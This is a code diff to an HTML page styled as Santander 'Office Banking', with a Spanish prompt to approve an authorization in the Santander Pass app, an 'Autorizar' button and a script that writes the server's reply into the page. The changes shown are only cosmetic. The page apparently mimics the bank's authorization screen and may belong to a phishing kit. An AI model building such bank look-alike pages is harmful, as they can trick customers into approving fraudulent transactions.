@@ -19,13 +19,20 @@
       0% { transform: rotate(0deg);}
       100% { transform: rotate(360deg);}
     }
+    .sub-text {
+      margin-top: 15px;
+      font-weight: bold;
+      color: #333;
+    }
   </style>
 </head>
 <body>
   <div class="login-box">
     <img src="logo-office-banking.png" alt="Office Banking" class="logo">
 
-    <h2>Se enviará una autorización a tu Aplicación AUTORIZA CON TU SANTANDER PASS</h2>
+    <h2>Se enviará una autorización a tu Aplicación</h2>
+    <p class="sub-text">AUTORIZA CON TU SANTANDER PASS</p>
+
     <button id="autorizarBtn" class="btn-rojo">Autorizar</button>
     <div id="resultado"></div>
   </div>
@@ -41,7 +48,7 @@
           headers: { "Content-Type": "application/json" }
         });
         const data = await response.text();
-        document.getElementById("resultado").innerHTML = `<p>${data}</p><div class="spinner"></div>`;
+        document.getElementById("resultado").innerHTML = `<p>${data}</p>`;
       } catch (error) {
         document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
       }
